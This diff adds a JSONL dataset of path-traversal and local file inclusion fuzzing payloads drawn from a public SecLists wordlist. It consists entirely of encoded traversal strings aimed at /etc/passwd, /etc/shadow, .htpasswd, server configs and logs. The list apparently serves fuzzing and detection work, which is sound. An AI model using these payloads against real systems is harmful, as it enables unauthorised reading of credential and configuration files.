@@ -1,0 +1,467 @@
+{"payload":"../_config.php%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:102","license":"MIT"}
+{"payload":"/core/config.php","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:104","license":"MIT"}
+{"payload":"c:\\System32\\Inetsrv\\metabase.xml","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:109","license":"MIT"}
+{"payload":"dbase.php a","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:116","license":"MIT"}
+{"payload":"../../../../../../../dev","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:118","license":"MIT"}
+{"payload":"%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:12","license":"MIT"}
+{"payload":"/etc/apache2/.htpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:121","license":"MIT"}
+{"payload":"/etc/apache2/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:123","license":"MIT"}
+{"payload":"/etc/apache2/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:124","license":"MIT"}
+{"payload":"/etc/apache2/vhosts.d/default_vhost.include","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:126","license":"MIT"}
+{"payload":"/etc/apache/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:128","license":"MIT"}
+{"payload":"/etc/apache/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:129","license":"MIT"}
+{"payload":"/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:13","license":"MIT"}
+{"payload":"/etc/chrootUsers","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:131","license":"MIT"}
+{"payload":"/etc/crontab","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:132","license":"MIT"}
+{"payload":"/etc/default/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:134","license":"MIT"}
+{"payload":"/etc/defaultrouter","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:135","license":"MIT"}
+{"payload":"/etc/fstab","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:136","license":"MIT"}
+{"payload":"/etc/ftpchroot","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:137","license":"MIT"}
+{"payload":"/etc/hostname.bge","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:140","license":"MIT"}
+{"payload":"/etc/hostname.ce3","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:144","license":"MIT"}
+{"payload":"/etc/hostname.dmfe0","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:149","license":"MIT"}
+{"payload":"/etc/hostname.dmfe2","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:151","license":"MIT"}
+{"payload":"/etc/hostname.dnet3","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:156","license":"MIT"}
+{"payload":"/etc/hostname.ecn2","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:159","license":"MIT"}
+{"payload":"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:16","license":"MIT"}
+{"payload":"/etc/hostname.ecn3","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:160","license":"MIT"}
+{"payload":"/etc/hostname.elx3","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:164","license":"MIT"}
+{"payload":"/etc/hostname.elxl1","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:166","license":"MIT"}
+{"payload":"/etc/hostname.eri0","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:169","license":"MIT"}
+{"payload":"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:17","license":"MIT"}
+{"payload":"/etc/hostname.ge3","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:176","license":"MIT"}
+{"payload":"/etc/hostname.hme0","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:177","license":"MIT"}
+{"payload":"/etc/hostname.hme2","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:179","license":"MIT"}
+{"payload":"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:18","license":"MIT"}
+{"payload":"/etc/hostname.ieef1","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:182","license":"MIT"}
+{"payload":"/etc/hostname.ieef2","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:183","license":"MIT"}
+{"payload":"/etc/hostname.ieef3","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:184","license":"MIT"}
+{"payload":"/etc/hostname.iprb0","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:185","license":"MIT"}
+{"payload":"/etc/hostname.iprb1","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:186","license":"MIT"}
+{"payload":"/etc/hostname.le0","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:189","license":"MIT"}
+{"payload":"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:19","license":"MIT"}
+{"payload":"/etc/hostname.lo","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:193","license":"MIT"}
+{"payload":"/etc/hostname.pcn1","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:195","license":"MIT"}
+{"payload":"/etc/hostname.pcn2","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:196","license":"MIT"}
+{"payload":"/etc/hostname.qfe0","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:198","license":"MIT"}
+{"payload":"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:20","license":"MIT"}
+{"payload":"/etc/hostname.qfe2","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:200","license":"MIT"}
+{"payload":"/etc/hostname.qfe3","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:201","license":"MIT"}
+{"payload":"/etc/hostname.spwr0","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:202","license":"MIT"}
+{"payload":"/etc/hostname.spwr2","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:204","license":"MIT"}
+{"payload":"/etc/hosts.allow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:209","license":"MIT"}
+{"payload":"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:21","license":"MIT"}
+{"payload":"/etc/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:213","license":"MIT"}
+{"payload":"/etc/httpd/conf/httpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:217","license":"MIT"}
+{"payload":"../../../../../../../etc/httpd/logs/acces_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:221","license":"MIT"}
+{"payload":"../../../../../../../etc/httpd/logs/acces.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:222","license":"MIT"}
+{"payload":"/etc/httpd/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:223","license":"MIT"}
+{"payload":"../../../../../etc/httpd/logs/access_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:225","license":"MIT"}
+{"payload":"/etc/httpd/logs/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:227","license":"MIT"}
+{"payload":"/etc/httpd/logs/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:228","license":"MIT"}
+{"payload":"/etc/inetd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:235","license":"MIT"}
+{"payload":"/etc/init.d/apache","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:236","license":"MIT"}
+{"payload":"/etc/init.d/apache2","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:237","license":"MIT"}
+{"payload":"/etc/issue","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:238","license":"MIT"}
+{"payload":"/etc/logrotate.d/ftp","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:239","license":"MIT"}
+{"payload":"..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:24","license":"MIT"}
+{"payload":"/etc/logrotate.d/vsftpd.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:242","license":"MIT"}
+{"payload":"/etc/mysql/my.cnf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:249","license":"MIT"}
+{"payload":"/etc/nsswitch.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:251","license":"MIT"}
+{"payload":"/etc/opt/ipf/ipf.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:252","license":"MIT"}
+{"payload":"/../../../../../../../../../../etc/passwd^^","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:256","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:259","license":"MIT"}
+{"payload":"..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:26","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:261","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:262","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:264","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:265","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:266","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:268","license":"MIT"}
+{"payload":"../../../../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:269","license":"MIT"}
+{"payload":"../../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:272","license":"MIT"}
+{"payload":"../../../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:273","license":"MIT"}
+{"payload":"../../../../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:275","license":"MIT"}
+{"payload":"../../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:278","license":"MIT"}
+{"payload":"../../etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:279","license":"MIT"}
+{"payload":"/admin/install.php","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:28","license":"MIT"}
+{"payload":"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:281","license":"MIT"}
+{"payload":"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:283","license":"MIT"}
+{"payload":"/etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:285","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:286","license":"MIT"}
+{"payload":"../../../../../../../../../../../../../../../../../../etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:290","license":"MIT"}
+{"payload":"../../../../../../../../../../../../etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:296","license":"MIT"}
+{"payload":"../../../../../../../../../etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:299","license":"MIT"}
+{"payload":"../../../../../etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:303","license":"MIT"}
+{"payload":"../../etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:306","license":"MIT"}
+{"payload":"../etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:307","license":"MIT"}
+{"payload":"/apache2/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:31","license":"MIT"}
+{"payload":"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:314","license":"MIT"}
+{"payload":"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:315","license":"MIT"}
+{"payload":"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:316","license":"MIT"}
+{"payload":"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:317","license":"MIT"}
+{"payload":"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:319","license":"MIT"}
+{"payload":"/apache2/logs/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:32","license":"MIT"}
+{"payload":"....\\/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:328","license":"MIT"}
+{"payload":"/apache2/logs/error.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:33","license":"MIT"}
+{"payload":"....\\/....\\/....\\/....\\/....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:330","license":"MIT"}
+{"payload":"....\\/....\\/....\\/....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:331","license":"MIT"}
+{"payload":"....\\/etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:334","license":"MIT"}
+{"payload":"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:335","license":"MIT"}
+{"payload":"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:338","license":"MIT"}
+{"payload":"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:339","license":"MIT"}
+{"payload":"....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:341","license":"MIT"}
+{"payload":"....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:345","license":"MIT"}
+{"payload":"....//....//....//....//....//....//etc/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:351","license":"MIT"}
+{"payload":"/etc/php4.4/fcgi/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:357","license":"MIT"}
+{"payload":"/etc/php4/apache2/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:358","license":"MIT"}
+{"payload":"../../../../../apache/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:36","license":"MIT"}
+{"payload":"/etc/php5/cgi/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:363","license":"MIT"}
+{"payload":"/etc/php/apache2/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:364","license":"MIT"}
+{"payload":"/etc/php/cgi/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:366","license":"MIT"}
+{"payload":"/etc/php.d/dom.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:367","license":"MIT"}
+{"payload":"/etc/php.d/gd.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:368","license":"MIT"}
+{"payload":"/etc/php.d/imap.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:369","license":"MIT"}
+{"payload":"../../../../apache/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:37","license":"MIT"}
+{"payload":"/etc/php.d/json.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:370","license":"MIT"}
+{"payload":"/etc/php.d/odbc.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:375","license":"MIT"}
+{"payload":"/etc/php.d/pdo_odbc.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:378","license":"MIT"}
+{"payload":"/etc/php.d/pdo_pgsql.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:379","license":"MIT"}
+{"payload":"/etc/php.d/pdo_sqlite.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:380","license":"MIT"}
+{"payload":"/etc/php.d/zip.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:385","license":"MIT"}
+{"payload":"/etc/php/php.ini","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:388","license":"MIT"}
+{"payload":"/etc/postfix/mydomains","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:389","license":"MIT"}
+{"payload":"/etc/proftp.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:390","license":"MIT"}
+{"payload":"/etc/pureftpd.passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:394","license":"MIT"}
+{"payload":"/etc/pureftpd.pdb","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:395","license":"MIT"}
+{"payload":"/etc/pure-ftpd/pure-ftpd.conf","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:396","license":"MIT"}
+{"payload":"/etc/pure-ftpd/pureftpd.pdb","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:398","license":"MIT"}
+{"payload":"/etc/release","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:399","license":"MIT"}
+{"payload":"%00/etc/passwd%00","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:4","license":"MIT"}
+{"payload":"../apache/logs/access.log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:40","license":"MIT"}
+{"payload":"/etc/rpc","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:401","license":"MIT"}
+{"payload":"/etc/security/failedlogin","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:403","license":"MIT"}
+{"payload":"/etc/security/group","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:404","license":"MIT"}
+{"payload":"/etc/security/passwd","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:407","license":"MIT"}
+{"payload":"/./././././././././././etc/shadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:409","license":"MIT"}
+{"payload":"/apache/logs/error_log","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:41","license":"MIT"}
+{"payload":"/../../../../../../../../../../etc/shadow^^","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:411","license":"MIT"}
+{"payload":"/etc/shadow","attack_type":"path-traversal","source":"danielmiessler/SecLists@cae9eab99585:Fuzzing/LFI/LFI-Jhaddix.txt:413","license":"MIT"}
